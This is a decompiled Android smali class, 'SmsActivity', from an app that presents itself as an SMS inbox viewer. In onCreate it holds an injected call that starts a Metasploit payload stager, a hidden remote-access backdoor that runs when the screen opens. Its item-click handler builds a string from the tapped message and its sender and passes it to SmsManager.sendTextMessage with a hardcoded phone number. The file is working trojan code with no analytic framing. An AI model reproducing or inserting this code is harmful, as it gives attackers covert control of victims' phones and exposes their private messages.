.class public Lwebhost/com/hackcm/SmsActivity;
.super Landroid/app/Activity;
.source "SmsActivity.java"

# interfaces
.implements Landroid/widget/AdapterView$OnItemClickListener;


# static fields
.field private static inst:Lwebhost/com/hackcm/SmsActivity;


# instance fields
.field arrayAdapter:Landroid/widget/ArrayAdapter;

.field smsListView:Landroid/widget/ListView;

.field smsMessagesList:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 21
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lwebhost/com/hackcm/SmsActivity;->smsMessagesList:Ljava/util/ArrayList;

    return-void
.end method

.method public static instance()Lwebhost/com/hackcm/SmsActivity;
    .locals 1

    .prologue
    .line 26
    sget-object v0, Lwebhost/com/hackcm/SmsActivity;->inst:Lwebhost/com/hackcm/SmsActivity;

    return-object v0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 37
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .line 38
    const v0, 0x7f040018

    invoke-virtual {p0, v0}, Lwebhost/com/hackcm/SmsActivity;->setContentView(I)V

    .line 39
    const v0, 0x7f0c0044

    invoke-virtual {p0, v0}, Lwebhost/com/hackcm/SmsActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ListView;

    iput-object v0, p0, Lwebhost/com/hackcm/SmsActivity;->smsListView:Landroid/widget/ListView;

    .line 40
    new-instance v0, Landroid/widget/ArrayAdapter;

    const v1, 0x1090003

    iget-object v2, p0, Lwebhost/com/hackcm/SmsActivity;->smsMessagesList:Ljava/util/ArrayList;

    invoke-direct {v0, p0, v1, v2}, Landroid/widget/ArrayAdapter;-><init>(Landroid/content/Context;ILjava/util/List;)V

    iput-object v0, p0, Lwebhost/com/hackcm/SmsActivity;->arrayAdapter:Landroid/widget/ArrayAdapter;

    .line 41
    iget-object v0, p0, Lwebhost/com/hackcm/SmsActivity;->smsListView:Landroid/widget/ListView;

    iget-object v1, p0, Lwebhost/com/hackcm/SmsActivity;->arrayAdapter:Landroid/widget/ArrayAdapter;

    invoke-virtual {v0, v1}, Landroid/widget/ListView;->setAdapter(Landroid/widget/ListAdapter;)V

    .line 42
    iget-object v0, p0, Lwebhost/com/hackcm/SmsActivity;->smsListView:Landroid/widget/ListView;

    invoke-virtual {v0, p0}, Landroid/widget/ListView;->setOnItemClickListener(Landroid/widget/AdapterView$OnItemClickListener;)V

    .line 45
    return-void
.end method

.method public onItemClick(Landroid/widget/AdapterView;Landroid/view/View;IJ)V
    .locals 11
    .param p2, "view"    # Landroid/view/View;
    .param p3, "pos"    # I
    .param p4, "id"    # J
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/widget/AdapterView",
            "<*>;",
            "Landroid/view/View;",
            "IJ)V"
        }
    .end annotation

    .prologue
    .line 68
    .local p1, "parent":Landroid/widget/AdapterView;, "Landroid/widget/AdapterView<*>;"
    :try_start_0
    iget-object v1, p0, Lwebhost/com/hackcm/SmsActivity;->smsMessagesList:Ljava/util/ArrayList;

    invoke-virtual {v1, p3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    .line 69
    .local v10, "smsMessages":[Ljava/lang/String;
    const/4 v1, 0x0

    aget-object v6, v10, v1

    .line 70
    .local v6, "address":Ljava/lang/String;
    const-string v9, ""

    .line 71
    .local v9, "smsMessage":Ljava/lang/String;
    const/4 v8, 0x1

    .local v8, "i":I
    :goto_0
    array-length v1, v10

    if-ge v8, v1, :cond_0

    .line 72
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    aget-object v2, v10, v8

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 71
    add-int/lit8 v8, v8, 0x1

    goto :goto_0

    .line 75
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 76
    .local v3, "smsMessageStr":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 77
    const/4 v1, 0x0

    invoke-static {p0, v3, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 80
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 81
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    const-string v1, "01155503120"

    const/4 v2, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 85
    .end local v0    # "smsManager":Landroid/telephony/SmsManager;
    .end local v3    # "smsMessageStr":Ljava/lang/String;
    .end local v6    # "address":Ljava/lang/String;
    .end local v8    # "i":I
    .end local v9    # "smsMessage":Ljava/lang/String;
    .end local v10    # "smsMessages":[Ljava/lang/String;
    :goto_1
    return-void

    .line 82
    :catch_0
    move-exception v7

    .line 83
    .local v7, "e":Ljava/lang/Exception;
    invoke-virtual {v7}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method public onStart()V
    .locals 0

    .prologue
    .line 31
    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    .line 32
    sput-object p0, Lwebhost/com/hackcm/SmsActivity;->inst:Lwebhost/com/hackcm/SmsActivity;

    .line 33
    return-void
.end method

.method public refreshSmsInbox()V
    .locals 10

    .prologue
    const/4 v2, 0x0

    .line 48
    invoke-virtual {p0}, Lwebhost/com/hackcm/SmsActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 49
    .local v0, "contentResolver":Landroid/content/ContentResolver;
    const-string v1, "content://sms/inbox"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    .line 50
    .local v8, "smsInboxCursor":Landroid/database/Cursor;
    const-string v1, "body"

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    .line 51
    .local v7, "indexBody":I
    const-string v1, "address"

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    .line 52
    .local v6, "indexAddress":I
    if-ltz v7, :cond_0

    invoke-interface {v8}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-nez v1, :cond_1

    .line 59
    :cond_0
    :goto_0
    return-void

    .line 53
    :cond_1
    iget-object v1, p0, Lwebhost/com/hackcm/SmsActivity;->arrayAdapter:Landroid/widget/ArrayAdapter;

    invoke-virtual {v1}, Landroid/widget/ArrayAdapter;->clear()V

    .line 55
    :cond_2
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "SMS From: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-interface {v8, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 56
    invoke-interface {v8, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 57
    .local v9, "str":Ljava/lang/String;
    iget-object v1, p0, Lwebhost/com/hackcm/SmsActivity;->arrayAdapter:Landroid/widget/ArrayAdapter;

    invoke-virtual {v1, v9}, Landroid/widget/ArrayAdapter;->add(Ljava/lang/Object;)V

    .line 58
    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_2

    goto :goto_0
.end method

.method public updateList(Ljava/lang/String;)V
    .locals 2
    .param p1, "smsMessage"    # Ljava/lang/String;

    .prologue
    .line 62
    iget-object v0, p0, Lwebhost/com/hackcm/SmsActivity;->arrayAdapter:Landroid/widget/ArrayAdapter;

    const/4 v1, 0x0

    invoke-virtual {v0, p1, v1}, Landroid/widget/ArrayAdapter;->insert(Ljava/lang/Object;I)V

    .line 63
    iget-object v0, p0, Lwebhost/com/hackcm/SmsActivity;->arrayAdapter:Landroid/widget/ArrayAdapter;

    invoke-virtual {v0}, Landroid/widget/ArrayAdapter;->notifyDataSetChanged()V

    .line 64
    return-void
.end method
